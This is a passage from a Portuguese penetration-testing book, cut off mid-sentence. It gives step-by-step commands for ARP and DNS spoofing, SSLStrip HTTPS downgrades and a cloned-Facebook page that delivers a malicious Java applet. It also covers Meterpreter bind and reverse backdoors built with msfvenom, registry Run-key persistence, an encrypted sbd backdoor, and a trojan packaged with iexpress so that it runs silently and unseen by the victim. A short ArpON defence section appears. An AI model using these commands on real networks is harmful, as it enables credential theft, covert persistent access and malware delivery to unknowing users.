/etc/ettercap/etter.dns\n:\n*.com\tA\t192.168.1.100\n*.com.br\tA\t192.168.1.100\n•\tInicie\to\tEttercap:\nroot@kali#\n\tettercap\t–TqM\tarp\t//\t//\t-P\tdns_spoof\n•\tAcesse\tqualquer\tsite\t\n.com\n,\t\n.com.br.\n11.4.5\tDnsspoof\nO\tutilitário\tDnsspoof\tpode\tser\tutilizado\tem\tconjunto\tcom\to\tprograma\tArpspoof\npara\trealizar\tum\tataque\tde\tARP\tSpoofing\te\tDNS\tSpoofing\tde\tforma\tmanual.\nPor\texemplo,\tvamos\trealizar\tum\tataque\tde\tDNS\tSpoofing:\ndnsspoof\t-i\t\ninterface\n\t-f\t\narquivo\nOpções:\n-i\t\ninterface\nCaso\ta\tinterface\tpara\to\tDNS\tSpoofing\tnão\tseja\ta\t\neth0\n,\tselecione-a\tcom\tessa\topção.-f\t\narquivo\nSelecione\to\tarquivo\tcontendo\to\tDNS\tSpoofing.\nPor\texemplo,\tvamos\trealizar\tum\tataque\tde\tARP\tSpoofing\te\tDNS\tSpoofing:\nroot@kali#\n\tarpspoof\t\t-t\t192.168.1.1\t192.168.1.110\nroot@kali#\n\tarpspoof\t\t-t\t192.168.1.110\t192.168.1.1\nAltere\to\tarquivo\t\n/root/dns.spoof\n\tpara\tque\to\thost\tenvenenado\t192.168.1.110\tseja\nredirecionado\tpara\to\tIP\t192.168.1.1:\n192.168.1.1<TAB>*.com\n192.168.1.1<TAB>*.com.br\n\t\nNota:\n\t<TAB>\tindica\ta\ttecla\t\nTAB\n,\te\tnão\to\ttexto\t<TAB>.\n\t\nRealize\to\tataque\tde\tDNS\tSpoofing:\nroot@kali#\n\tdnsspoof\t–f\t/root/dns.spoof\nCom\to\tIP\t192.168.1.110\t(IP\tcom\ta\ttabela\tARP\tenvenenado),\tacesse\tum\tsite\n.com.br\n.\n11.4.6\tSSLStrip\nO\tEttercap\té\tum\texcelente\tsniffer,\tporém,\tquando\ta\tconexão\té\tcriptografada\t–\ncomo\tem\tconexões\tHTTPS\t–,\to\tEttercap\tcaptura\tos\tdados,\tmas,\tcomo\testes\nestão\tcriptografados,\ttornam-se\tilegíveis\tpara\tos\tolhos\thumanos,\te\to\tEttercap\nnão\tmostra\tna\ttela\tesses\tdados\timcompreensíveis.\tPara\tcontornar\tesse\tproblema,\nnós\tdevemos\tutilizar\to\tSSLStrip.\nSSLStrip\té\tum\tprograma\tque\tpossibilita\ta\tquebra\tdo\tprotocolo\tHTTPS.\tDessa\nforma,\to\tEttercap\tcaptura\tos\tdados\te\to\tSSLStrip\t“quebra”\to\tHTTPS\tpara\tHTTP.\nAssim,\ta\tleitura\tde\ttráfego\tHTTPS\tpelo\tEttercap\té\tpossível.\n11.4.6.1\tLaboratório\tSSLStrip\n•\tHabilite\to\troteamento\tde\tpacotes\t(IP\tforward):\nroot@kali#\t\necho\t1\t>\t/proc/sys/net/ipv4/ip_forward\n•\tAdicione\ta\tseguinte\tregra\tno\tiptables:\nroot@kali#\t\niptables\t-t\tnat\t-A\tPREROUTING\t-p\ttcp\t--destination-port\t80\t-j\tREDIRECT\t--to-port\t8001\n•\tInicie\to\tSSLStrip:\nroot@kali#\t\nsslstrip\t-l\t8001•\tInicie\to\tEttercap:\nroot@kali#\t\nettercap\t-TqM\tarp\t//\t//\nAcesse\tum\tsite\tque\ttenha\tHTTPS.\tSerá\tpedido\tque\to\tusuário\tinstale\tum\ncertificado\tdigital.\tEsse\té\to\tcertificado\tdo\tSSLStrip;\to\tusuário\tinstalando-o\tserá\npossível\trealizar\ta\tcaptura\tda\tsenha.\nObserve\ttambém\tque\to\tsite\tque\tantes\ttinha\to\tHTTPS\tagora\té\tHTTP.\tA\tconexão\nsegura\tvia\tHTTPS\tfoi\tquebrada\tpelo\tSSLStrip.\n11.4.7\tSSLSplit\nDe\tforma\tanáloga\tao\tSSLStrip,\to\tSSLSplit\trealiza\ta\tinterceptação\tde\tcertificados\ndigitais,\tinserindo\tum\tcertificado,\te,\tcaso\tseja\taceito\tpelo\tusuário,\tpossibilita\n“quebrarmos”\to\tcertificado\tdigital\tverdadeiro.\nSintaxe\tde\tuso:\nsslsplit\t\nopções\n\t\nproto\tendereço\tporta\nOpções:\n-D\nExecuta\to\tSSLSplit\tem\tbackgroud.\n-l\t\narquivo\nArquivo\tde\tlog\tpara\tregistrar\tas\tconexões.\n-j\t\ndiretorio\nDiretório\tdo\tchroot.\n-S\t\ndiretório\nDiretório\tonde\tsão\tarmazenados\tos\tarquivos\tde\tconexão\tpara\tcada\tsite.\n-k\t\nca.key\nChave\tprivada\tdo\tcertificado\tdigital.\n-c\t\nca.crt\nCertificado\tpúblico.\nproto\nProtocolo\ta\tser\tutilizado.\tPor\texemplo,\to\tSSL.\nendereço\nEndereço\tque\to\tSSLSplit\tvai\tescutar\t(.0.0.0.0\tindica\ttodos\tos\tendereços\tlocais).\nporta\nPorta.\nExemplo:\nroot@kali#\n\tsslsplit\t–l\tconnections.log\t–j\t/tmp/sslsplit/\t-S\tlogdir\t-k\tca.key\t-c\tca.crt\tssl\t0.0.0.0\t8443\ttcp\n0.0.0.0\t8080\n11.4.8\tAtaque\tSSLStrip,\tDNS\tSpoofing\te\tJava\tApplet\nUma\tcombinação\tde\tataques\tpode\tser\tefetuada\tpor\tmeio\tdo\tSSLStrip\tcom\toDNS\tSpoofing.\nPor\texemplo:\tcaso\to\tusuário\tacesse\to\tsite\tdo\tFacebook,\tserá\tredirecionado\tpara\num\tsite\tfalso\t(devido\tao\tDNS\tSpoofing\te\to\tEttercarp)\te,\tnesse\tsite\tfalso\n(aparentemente\t100%\tlegítimo,\tincluindo\to\tlink\tde\tacesso),\to\tusuário\tserá\npresenteado\tcom\tum\tapplet\tJava\tfalso,\tpossibilitando\tacesso\tmeterpreter\tà\tsua\nmáquina.\nPrimeiro,\tconfigure\to\tSET\tpara\tgerar\tum\tapplet\tJava\tclonando\tum\tsite\tqualquer.\nPor\texemplo,\tvou\tclonar\to\tsite\tdo\tFacebook.\tMais\tdetalhes\tsobre\to\tataque\tde\nApplet\tJava\tpode\tser\tconsultado\tno\tcapítulo\t10,\t“Engenharia\tsocial”.\n•\tUma\tvez\tcom\to\tsite\tclonado,\tinicie\to\tataque\tcom\to\tSSLStrip:\nroot@kali#\t\necho\t1\t>\t/proc/sys/net/ipv4/ip_forward\nroot@kali#\t\niptables\t-t\tnat\t-A\tPREROUTING\t-p\ttcp\t--destination-port\t80\t-j\tREDIRECT\t--to-port\t8001\nroot@kali#\t\nsslstrip\t-l\t8001\n•\tAltere\to\tarquivo\t\n/etc/ettercap/etter.dns\n:\nwww.facebook.com\t\tA\t\t192.168.1.100\nfacebook.com\t\t\t\t\t\tA\t\t192.168.1.100\n•\tRealize\to\tDNS\tSpoofing\tcom\to\tEttercap:\nroot@kali#\t\nettercap\t–TqM\tarp\t//\t//\t-P\tdns_spoof\nNa\tmáquina\tWindows,\tacesse\to\tsite\t\nhttp://www.facebook.com\n.\tNesse\tmomento,\na\tvítima,\tao\tentrar\tno\tsite\tdo\tFacebook,\tserá\tpresenteada\tcom\tum\taplicativo\tJava\nmalicioso.\nO\tinteressante\tde\tse\tcombinar\tesses\ttrês\tataques\té\tque,\tmesmo\tque\tas\tversões\nmais\tnovas\tdo\tJava\tbloqueiem\tapplets\tmaliciosos,\to\taplicativo\tparece\trealmente\nvir\tdo\tsite\t\nhttp://ww.facebook.com\n,\tpassando\tuma\tmaior\tcredibilidade\tao\tataque\n(Figura\t11.9).Figura\t11.9\t–\tO\tusuário\tacessa\to\tsite\tdo\tFacebook,\tmas\té\tredirecionado\tpara\to\nnosso\tsite\tclonado\tcom\tum\tapplet\tJava\tmalicioso.\nDesbloqueie\tapplets\tvindos\tde\t\nhttp://www.facebook.com\n,\tconforme\tmostra\ta\nfigura\t11.10.\nFigura\t11.10\t–\tO\tusuário\tdeve\tdesbloquear\tapplets\tJava.\nAcesse\tnovamente\t\nhttp://www.facebook.com\n.\n11.4.9\tBloqueando\to\tArp\tSpoofing\nHá\tdiversas\tmedidas\tque\tpodem\tser\tutilizadas\tpara\tbloqueio\tdo\tARP\tSpoofing,\ncomo\ta\tadoção\tde\tVPNs,\tprogramas\tpara\tmonitoramento\tda\ttabela\tARP\tetc.\nPara\to\tLinux,\thá\tum\texcelente\tprograma\tchamado\tArpON.\nInstale\to\tprograma\tArpON:\nroot@debian#\t\napt-get\tinstall\tarponÉ\tpossível\tconfigurar\to\tArpON\tde\tduas\tformas.\tA\tprimeira\tforma\té\tconfigurá-lo\npelo\tSARPI.\tÉ\tnecessário\tque\to\tleitor\tinsira\tcada\tendereço\tIP\tda\trede\tvinculado\njuntamente\tcom\to\tseu\tendereço\tMAC.\tO\tprocesso\té\testático.\nA\tsegunda\tforma\t(mais\tsimples)\té\tpelo\tDARPI.\tO\tpróprio\tArpON\tfaz\ta\tleitura\te\nassociação\tde\tcada\tendereço\tIP\tda\trede\tcom\to\tseu\tendereço\tMAC.\tO\tprocesso\té\ndinâmico.\nEm\tqualquer\tum\tdos\tmodos,\tse\thouver\talterações\tna\ttabela\tARP,\to\tArpON\nexibirá\tessa\talteração\tcomo\talerta\tno\tarquivo\tde\tlog\te\tnão\tfará\tmudanças\tna\ntabela\tARP,\tou\tseja,\tbloqueará\to\tMitM.\nVamos\tconfigurá-lo\tpelo\tSARPI.\n•\tEdite\to\tarquivo\tde\tconfiguração\tdo\tarpon\t\n/etc/default/arpon\n:\n#\tFor\tSARPI\tuncomment\tthe\tfollowing\tline\t(please\tedit\talso\t/etc/arpon.sarpi)\nDAEMON_OPTS=\"-q\t-f\t/var/log/arpon/arpon.log\t-g\t-s\"\n#\tFor\tDARPI\tuncomment\tthe\tfollowing\tline\n#DAEMON_OPTS=\"-q\t-f\t/var/log/arpon/arpon.log\t-g\t-d\"\nRUN=\"yes\"\n•\tEdite\to\tarquivo\t\n/etc/arpon.sarpi\n:\n#Defina\testaticamente\tos\tendereços\tIPs\te\to\tseu\tendereço\tMAC.\tEstou\tinserindo\tapenas\to\tMAC\tdo\tmeu\nroteador,\to\tcorreto\té\tinserir\ta\trelação\tIPxMAC\tda\trede\tinteira.\n192.168.1.1\t\t\t74:ea:3a:e1:e8:66\n•\tInicie\to\tArpON:\nroot@debian#\n\tservice\tarpon\tstart\nCaso\talguma\ttentativa\tde\tmudança\tna\ttabela\tARP\tseja\trealizada\t(como\tum\nataque\tMitM),\tacompanhe\tos\tlogs\tem\t\n/var/log/arpon/arpon.log\n.\nroot@debian#\t\ntail\t-f\t/var/log/arpon/arpon.log\n1\n\tDefinições\tde\tacordo\tcom\tShakeel\tAli\te\tTedi\tHeriyanto,\tautores\tdo\tlivro\t\nBacktrack\t4:\tAssuring\tSecurity\nby\tPenetration\tTesting\n.\t(p.\t276.)CAPÍTULO\n\t12\nManutenção\tdo\tacesso\nUma\tvez\tconseguido\to\tacesso\tao\tshell\tdo\tsistema\te\tcom\tseus\tprivilégios\tde\nautoridade,\ta\tpróxima\tetapa\tconsiste\tem\timplantar\tuma\tporta\tdos\tfundos\tou\nbackdoor\tno\tsistema\tem\tteste,\tpois\tcomo\tfoi\tmostrado\tna\texploração\tdo\nWindows\t7,\tmesmo\tque\to\tadministrador\tdo\tsistema\tpare\tde\tusar\to\tserviço\tou\ncorrija\ta\tfalha\tencontrada,\ta\tbackdoor\tabre\tuma\tporta\tque\tpermite\tao\tauditor\nvoltar,\tmesmo\tque\to\tsistema\testeja\tatualizado\te\tcom\tsuas\tfalhas\tcorrigidas.\nNessa\tetapa\tsão\tutilizadas\tferramentas\tpara\tmanutenção\tde\tacesso\te\ttambém\npoderão\tser\tnecessárias\tferramentas\tque\t“burlem”\tregras\tde\tfirewall,\tcaso\thaja\nregras\tde\tacesso\trestritivas\tna\trede.\n12.1\tBackdoors\nUma\tbackdoor\té\tum\tprograma\tque\tfica\tesperando\tpor\tconexões,\tpermitindo\to\nacesso\tao\tshell\tdo\tsistema\t(feito\tde\tmaneira\tremota).\tUma\tbackdoor\tpossibilita\nque\to\tauditor\tfaça\tnovas\tvisitas\tao\tsistema\tauditado\tsem\tpassar\tnovamente\tpor\ntodo\to\tteste\tde\tintrusão.\nPara\tcriarmos\tuma\tbackdoor,\tnovamente\tserá\tutilizado\to\tframework\tMetasploit,\nque\tcontém\talguns\tpayloads,\tque\tsão\tcargas\tmaliciosas\tusadas\tnos\texploits.\nPorém\tum\tpayload\tpode\tser\tcompilado\tindependentemente\tdo\texploit\t(lembre-se\nde\tque\tera\to\tpayload\tque\tde\tfato\tmantinha\tum\tcanal\tde\tconexão\tentre\ta\tvítima\te\no\tatacante).\tCaso\to\tpayload\tseja\tcompilado\tsem\to\texploit,\ttorna-se\tuma\nbackdoor.\tO\tpayload\tutilizado\tno\tdecorrer\tdo\tlivro\té\to\tMeterpreter\te\té\nfundamentalmente\tsobre\tele\tque\tvamos\tgerar\ta\tnossa\tbackdoor.\nCaso\tlhe\tinteresse,\to\tMetasploit\tpossui\toutros\tpayloads\talém\tdo\tMeterpreter:\nroot@kali#\t\nmsfvenom\t--list\tpayloads\nPara\tver\tas\topções\tde\tdeterminado\tpayload:\nroot@kali#\n\tmsfvenom\t--payload\twindows/meterpreter/bind_tcp\t--payload-options\n12.1.1\tBackdoors\tde\tconexão\tdiretaPrimeiro,\tconfigure\to\tMetasploit\tpara\tlistar\tpor\tconexões:\nroot@kali#\n\tmsfconsole\nmsf\n\t>\tuse\texploit/multi/handler\nmsf\n\texploit(handler)\t>\tset\tPAYLOAD\twindows/meterpreter/bind_tcp\nmsf\n\texploit(handler)\t>\tset\tLPORT\t12345\nmsf\n\texploit(handler)\t>\tset\tRHOST\t192.168.1.101\nmsf\n\texploit(handler)\t>\texploit\nVeja\tquais\tsão\tas\topções\tdo\tpayload\t\nwindows/meterpreter/bind_tcp\n:\nroot@kali#\t\nmsfvenom\t--payload\twindows/meterpreter/bind_tcp\t--payload-options\nPara\tnós\tinteressa\tsomente\ta\topção\tde\tporta\tlocal\t(LPORT\t–\tColuna\tRequired\nmarcada\tcomo\tyes),\tque\té\ta\tporta\tque\ta\tnossa\tvítima\tficará\tesperando\tpor\nconexões\tdo\tatacante.\nGere\to\tarquivo\texecutável\tque\tcontém\ta\tcarga\tmaliciosa\tde\tacordo\tcom\tas\nopções\tdo\tpayload:\nroot@kali#\t\nmsfvenom\t--payload\twindows/meterpreter/bind_tcp\tLPORT=12345\t--format\texe\t>\n/var/www/bind.exe\nExecute\to\tarquivo\t\nbind.exe\n\tno\tWindows.\n12.1.2\tBackdoors\tde\tconexão\treversa\nPrimeiro,\tconfigure\to\tMetasploit\tpara\tlistar\tpor\tconexões:\nroot@kali#\n\tmsfconsole\nmsf\n\t>\tuse\texploit/multi/handler\nmsf\n\texploit(handler)\t>\tset\tPAYLOAD\twindows/meterpreter/reverse_tcp\nmsf\n\texploit(handler)\t>\tset\tLPORT\t12345\nmsf\n\texploit(handler)\t>\tset\tLHOST\t192.168.1.100\nmsf\n\texploit(handler)\t>\texploit\nVeja\tquais\tsão\tas\topções\tdo\tpayload\t\nwindows/meterpreter/reverse_tcp\n:\nroot@kali#\t\nmsfvenom\t--payload\twindows/meterpreter/reverse_tcp\t--payload-options\nPara\tnós\tinteressa\tsomente\tas\topções\tde\tporta\tlocal\t(LPORT\t–\tColuna\tRequired\nmarcada\tcomo\tyes)\te\thost\tremoto\t(LHOST\t–\tColuna\tRequired\tmarcada\tcomo\nyes).\tNo\tcaso\tdo\tpayload\tde\tconexão\treversa\n(\nwindows/meterpreter/reverse_tcp\n),\to\tprocesso\té\tinverso:\ta\tmáquina\tvítima\tvai\nse\tconectar\tà\tmáquina\tatacante.\tOu\tseja,\tnesse\tcaso,\tLPORT\tindica\ta\tporta\tlocal\nna\tmáquina\tdo\tatacante\tque\tficará\tesperando\tpor\tconexões,\te\tLHOST\tindica\to\tIPdo\tatacante\tao\tqual\ta\tvítima\tdeverá\tse\tconectar.\nGere\to\tarquivo\texecutável\tque\tcontém\ta\tcarga\tmaliciosa\tde\tacordo\tcom\tas\nopções\tdo\tpayload:\nroot@kali#\t\nmsfvenom\t--payload\twindows/meterpreter/reverse_tcp\tLPORT=12345\nLHOST=192.168.1.100\t--format\texe\t>\t/var/www/reverse.exe\nExecute\to\tarquivo\t\nreverse.exe\n\tno\tWindows.\nA\tdiferença\tentre\to\tbind\tShell\te\to\treverse\tShell\té\tque,\tno\tbind\tShell,\to\tauditor\tse\nconecta\tà\tmáquina\tdiretamente.\tNo\tpassado\tesse\tmétodo\tera\tmuito\tutilizado,\ncomo\tem\tbackdoors\tcomo\to\tNetBus,\tSubSeven\te\to\tBackOrifice.\tPorém,\tcom\to\nadvento\tda\tNAT\t(Network\tAddress\tTranslation)\te\tde\tfirewalls,\ttornou-se\ncomplicado\to\tatacante\tconectar-se\tdiretamente\tà\tmáquina\talvo,\tpor\tisso,\tcomo\nmedida\tpara\tburlar\tfirewall,\ta\tconexão\treversa\tentra\tem\tcena.\tNesse\tcenário\ta\nmáquina\tcomprometida\tconecta-se\tà\tmáquina\tdo\tatacante,\tburlando\tNAT\te\nfirewall.\tO\tuso\tdo\tbind\tShell\té\tantigo\te\tde\tdifícil\tutilização\tnos\tdias\tde\thoje\t(a\nnão\tser\tem\tredes\tDMZ).\tO\tmelhor\tpayload\ta\tser\tadotado\té\ta\tconexão\treversa.\nUma\tvez\tcom\ta\tconexão\testabelecida,\tserá\tnecessário\tinstalar\ta\tbackdoor\tno\nregistro\tdo\tWindows;\tsupondo\tque,\tno\tmomento\tem\tque\thouver\tperda\tde\nconexão\t(por\texemplo,\tse\ta\tmáquina\tfor\treinicializada),\testa\tseja\trestabelecida\nsem\tmaiores\tproblemas.\nPara\tinstalar\ta\tbackdoor\tno\tsistema\t(com\to\tMeterpreter\tativo),\tprimeiro\tconsiga\nacesso\tao\tusuário\t\nnt\tauthority\\system\n\t(esse\tprocesso\tpode\tser\tvisto\tna\tseção\n9.4.5\t“User\tInterface\tcommands”).\nTransfira\to\tarquivo\tpara\tuma\tpasta:\nmeterpreter\n\t>\tupload\t/var/www/reverse.exe\t'C:\\Windows'\nRealize\ta\tenumeração\tdas\tchaves\tdo\tregistro:\nmeterpreter\n\t>\treg\tenumkey\t–k\tHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\nInstale\ta\tbackdoor\tno\tregistro.\tDessa\tforma,\tquando\ta\tmáquina\tfor\nreinicializada,\tserá\texecutada\ta\t\nreverse.exe\n:\nmeterpreter\n\t>\treg\tsetval\t-k\tHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\t-v\treverse\t-d\n'C:\\Windows\\reverse.exe'\nRealize\tnovamente\tenumeração\tdas\tchaves\tdo\tregistro.\tDesta\tvez\ta\tchave\nencontra-se\tativa:\nmeterpreter\n\t>\treg\tenumkey\t-k\tHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunCaso\tnecessário,\tconfirme\tas\tinformações\tsobre\ta\tchave\tinstalada:\nmeterpreter\n\t>\treg\tqueryval\t–k\tHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\t–v\treverse\n12.2\tBackdoor\tsbd\nSbd\té\tum\tprograma\tsimiliar\tao\tnetcat\t(lembre-se\tde\tque\tpodemos\tusar\to\tnetcat\ncomo\tbackdoor),\tmas\tcom\tfuncionalidades\ta\tmais,\tcomo\ta\tcriptografia\tdos\ndados\tutilizando\to\tAES.\nCaso\toptemos\tpor\tutilizar\to\tnetcat,\tum\tadministrador\texperiente\tpoderá\ninterceptar\to\tnosso\ttráfego\tde\tdados\te\tsaber\to\tque\testamos\tfazendo.\tUtilizando\to\nsbd,\tmesmo\tque\to\tadministrador\tcapture\tos\tdados,\testes\testarão\tilegíveis.\tO\tseu\nuso\té\tidêntico\tao\tnetcat,\tpor\tisso\tvamos\tapenas\tcriar\tuma\tbackdoor\tcom\ncriptografia.\nO\texecutável\tdo\tsbd\tpode\tser\tencontrado\tem\t\n/usr/share/windows-\nbinaries/sbd.exe\n.\nOpções:\n-r\t\nn\nReativa\ta\tconexão\tapós\t\nn\n\tsegundos.\tSe\t\nn\n\tfor\t0,\ta\tconexão\tfica\tativa\tpermanentemente.\n-c\t\non/off\nHabilita/Desabilita\ta\tcriptografia.\tPor\tpadrão,\ta\tcriptografia\té\thabilitada.\n-k\t\nsenha\nDefine\ta\tnova\tsenha\ta\tser\tutilizada\t\npara\tcriptografar\tos\tpacotes.\nNo\tWindows,\tinicie\ta\tbackdoor,\tmantendo\tuma\tconexão\tpermanente\te\tdefinindo\numa\tsenha\tpara\tcriptografar\tos\tpacotes\t(lembre-se\tde\tque\tos\tpacotes\tsão\ncriptografados\tcom\tuma\tchave\tou\tsenha):\nC:\\\n\tsbd.exe\t-l\t-p\t666\t-e\tcmd.exe\t-r0\t-k\tsenha_secreta\nNo\tKali\tLinux,\tconecte-se\tao\tWindows:\nroot@kali#\n\tsbd\t192.168.1.101\t666\t-k\tsenha_secreta\nOs\tdados\te\toperações\tque\tacontecem\tna\tconexão\tdo\tsbd\testão\tcriptografados\te\nprotegidos,\ttornando\ta\tanálise\tda\trede\tna\ttentativa\tde\tdetecção\tde\tintruso\tuma\ntarefa\tmais\tdifícil.\n12.2\tCavalos\tde\tTroia\nOs\tcavalos\tde\tTroia\t(também\tchamados\tde\tTrojan\tHorse)\tsão\tprogramasanexados\ta\toutros\tprogramas\tde\tmaneira\tanáloga\tà\thistória\tde\tTroia,\tem\tque\tos\ngregos,\tvendo\tque\tperderiam\ta\tbatalha,\tpresentearam\tos\ttroianos\tcom\tum\tcavalo\nde\tmadeira,\te,\tde\tdentro\tdesse\tcavalo,\tsaíram\tsoldados\tgregos.\nOs\tcavalos\tde\tTroia\tcomputacionais\tsão\tprogramas\tlegítimos\tnos\tquais,\tuma\tvez\nque\to\tusuário\texecute-os,\ttambém\tserá\texecutado\t(em\tbackground)\tum\nprograma\tmalicioso\t(normalmente\tuma\tbackdoor).\nUm\texemplo\tclássico\tno\tpassado\tfoi\to\tprograma\tWhack-a-mole,\tum\tjogo\tem\nque\to\tusuário\ttinha\tde\tmartelar\tas\tminhocas\tpara\tganhar\tpontos.\tPorém\texistiam\nversões\tdesse\tjogo\tque\testavam\tinfectadas\tcom\ta\tbackdoor\tNetbus.\tA\tfigura\n12.1\tmostra\ta\ttela\tinicial\tdo\tjogo\tWhack-a-mole.\nFigura\t12.1\t–\tTela\tinicial\tdo\tjogo\tWhack-a-mole.\n12.3\tEXE\tJoiner\nO\tEXE\tJoiner\té\tum\tprograma\tque\tjunta\tdois\tarquivos\tem\tum\túnico\tarquivo,\ngerando\tum\tterceiro\tarquivo.\nNormalmente,\to\tEXE\tJoiner\tapresenta\tcódigo-fonte\tfechado\te\tpode\tser\nencontrado\taos\tmilhares\tna\tinternet.\tPorém\to\tproblema\tdesse\ttipo\tde\tEXE\tJoiner\né\tque,\tpor\tter\tcódigo\tfechado,\tnão\thá\tcomo\tsaber\to\tque\trealmente\to\tJoiner\té;\tse\nrealmente\té\to\tEXE\tJoiner,\tcomo\tprometido\tpelo\tpróprio\tprograma,\tou\tse\tele\ncarrega\tconsigo\talguma\tcarga\tviral\tou\tbackdoor.\tAlém\tde\tque\tesses\tprogramas\nnormalmente\tsão\tdetectados\tpelo\tantivírus.\tEm\tvez\tde\trealizar\to\tdownload\tdesse\ntipo\tde\tarquivo\té\tpossível\tcriar\tum\tEXE\tJoiner.\nO\tseu\tfuncionamento\té\to\tseguinte:\tO\tExe\tJoiner\t“ensacola”\to\tprimeiro\te\to\nsegundo\tarquivos\tem\tum\tterceiro\tarquivo.\tO\tprograma\tresponsável\tpor\n“ensacolar”\tos\tdois\tarquivos\tem\tum\tsó\té\tchamado\tde\tSTUB.\tEsse\tterceiroarquivo\t(“ensacolado”\tpelo\tSTUB),\tno\tmomento\tem\tque\tfor\texecutado,\ndesempacota\tos\tdois\tarquivos\t(geralmente)\tna\tpasta\ttemporária\t(\necho\n%TEMP%\n)\tdo\tWindows\te\texecuta\tos\tdois\tarquivos\tdesempacotados.\nFundamentalmente\tum\tEXE\tJoiner\té\tum\tarquivo\tautoextrator\t(arquivo\tSFX),\ncom\ta\tdiferença\tde\tque\to\tJoiner\tvai\texecutar\tos\tdois\tarquivos\trecém-\ndesempacotados.\nUm\tExe\tJoiner\tpode\tser\tfeito\tcom\to\tutilitário\t\niexpress.exe\n\tdo\tWindows,\tque\té\num\tcriador\tde\tarquivos\tSFX\t(arquivos\tautoextraídos).\tPodemos,\tdessa\tforma,\ncriar\tum\tarquivo\tcontendo\to\tprograma\tnormal\tanexado\tcom\ta\tnossa\tbackdoor.\nDigite\tiexpress\tno\tmenu\tdo\tWindows,\tconforme\tmostra\ta\tfigura\t12.2.\nFigura\t12.2\t–\tiexpress.\nNa\ttela\t\nWelcome\tto\tIExpress\t2.0\n,\tcrie\tum\tnovo\tarquivo\tSFX\t(arquivo\nautoextrator)\tescolhendo\ta\topção\t\nCreate\tnew\tSelf\tExtraction\t.\nNa\ttela\t\nPackage\tpurpose\n,\tselecione\ta\tprimeira\topção\t\nExtract\tfiles\tand\trun\tan\ninstallation\tcommand\n\tpara\textrair\tum\tarquivo\te\texecutá-lo.\nNa\ttela\t\nPackage\ttitle\n,\tescolha\tum\tnome\tpara\to\tpacote.\nNa\ttela\t\nConfirmation\tprompt\n,\tescolha\ta\topção\t\nNo\tprompt\n\tpara\tque\to\tnosso\ncavalo\tde\tTroia\tnão\tinteraja\tcom\to\tusuário,\tnão\tcrie\tnenhum\ttipo\tde\tmensagem\te\nque\tseja\to\tmais\tsilencioso\tpossível.\tCaso\tdeseje,\to\tleitor\tpoderá\tselecionar\ta\nopção\t\nPrompt\tuser\twith\n\t(mas\tnão\té\to\trecomendável\tpara\to\tnosso\tobjetivo).\nNa\ttela\t\nLicense\tagreement\n,\tescolha\ta\topção\t\nDo\tnot\tdisplay\ta\tlicense\n\tpara\tnão\tser\nexibido\tnenhum\ttipo\tde\tlicença.Na\ttela\t\nPackaged\tfiles\n,\tescolha\tos\tarquivos\tque\tserão\tempacotados.\tLembre-se\nde\tescolher\tum\tarquivo\tqualquer\tque\tservirá\tcomo\tisca\t(como\tum\tpequeno\tjogo\nou\toutro\texecutável\tdo\tgênero)\te\ttambém\tde\tescolher\ta\tnossa\tbackdoor\t(em\nformato\t\n.exe\n).\nNa\ttela\t\nInstall\tProgram\tto\tLaunch\n,\thá\tduas\topções\tde\tseleção\tpara\texecução\tdos\ndois\tarquivos.\tNa\topção\t\nInstall\tProgram\n,\tselecione\to\tarquivo\texecutável\t(um\njogo\tou\tarquivo\tdo\tgênero)\tque\tserá\tinstalado\tquando\to\tusuário\tabrir\to\tnosso\ncavalo\tde\tTroia.\tNo\tmomento\tem\tque\ta\tinstalação\t(ou\texecução)\tdesse\tprimeiro\narquivo\tfor\tfinalizada\t(por\texemplo,\tquando\to\tusuário\tfechar\to\tjoguinho),\tserá\nexecutada\ta\topção\t\nPost\tInstall\tProgram\n,\tindicando\tqual\tserá\to\tarquivo\t(no\tnosso\ncaso\ta\tbackdoor)\ta\tser\texecutado.\tÉ\tnesse\tmomento\tqua\ta\tmáquina\tvítima\tserá\ncomprometida.\nNa\ttela\t\nShow\tWindow\n,\té\tselecionado\to\ttipo\tde\tanimação\tno\tmomento\tda\nextração\tde\tarquivos.\tHá\topções\tcomo\t\nDefault\n,\t\nHidden\n,\t\nMinimized\n\te\nMaximized\n.\tEscolha\to\ttipo\tde\tanimação\t\nHidden\n,\tpois,\tdessa\tforma,\ta\textração\ndos\tarquivos\tserá\tinvisível\taos\tolhos\tdo\tusuário.\nNa\ttela\t\nFinished\tmessage\n,\té\tescolhida\tuma\tmensagem\tao\tterminar\ta\textração\te\nexecução\tdos\tdois\tarquivos.\tEscolha\ta\topção\t\nNo\tmessage\n\tpara\tnão\texibir\nnenhuma\tmensagem\tadicional\tao\tusuário.\nNa\ttela\t\nPackage\tName\tand\tOptions\n,\to\tnosso\tcavalo\tde\tTroia\tdeve\tser\tsalvo\tno\nformato\t\n.exe\n.\tEntão\tsalve\to\tarquivo\te\tescolha\ta\topção\t\nHide\tFile\tExtracting\nProgress\tAnimation\tfrom\tUser\n\tpara\tesconder\ttoda\ta\tanimação\tde\textração\tdo\nusuário.\nNa\ttela\t\nConfigure\trestart\n,\to\tsistema\tpode\tser\treinicializado\tapós\to\ttérmino\tda\nexecução\tdo\tnosso\tcavalo\tde\tTroia.\tEntão,\tpor\texemplo,\to\tsistema\tvítima\t(após\nexecutar\to\tnosso\tarquivo)\tnão\tserá\treiniciado\t(opção\t\nNo\trestart\n),\nobrigatóriamente\tserá\treiniciado\t(opção\t\nAlways\trestart\n)\tou\treiniciado\tsomente\tse\nnecessário\t(opção\t\nOnly\trestart\tif\tneed)\n.\tEscolha\ta\topção\t\nNo\trestart\t\npara\tque\ta\nmáquina\tnão\treinicie\tapós\ta\textração\te\texecução\tdos\tarquivos.\nNa\ttela\t\nSave\tSelf\tExtraction\tDirective\n,\tcaso\tqueira\tsalvar\to\tprojeto,\tescolha\ta\nopção\t\nSave\tSelf\tExtraction\tDirective\t(SED)\tfile\n.\tCaso\tcontrário,\tescolha\ta\topção\nDon’t\tsave\n.\nO\tarquivo\t\nTrojan\tHorse.exe\n\tfoi\tcriado\te\tpoderá\tser\tencaminhado\tpara\to\tusuário.\nUm\tarquivo\tSFX\ttambém\tpode\tser\tcriado\tutilizando-se\to\tWinrar.Crie\tum\tarquivo\tchamado\t\nSTUB.BAT\n\tcom\to\tseguinte\tconteúdo:\nstart\tBackdoor.exe\nstart\tWhack-a-mole.exe\nGere\tum\tarquivo\texecutável\ta\tp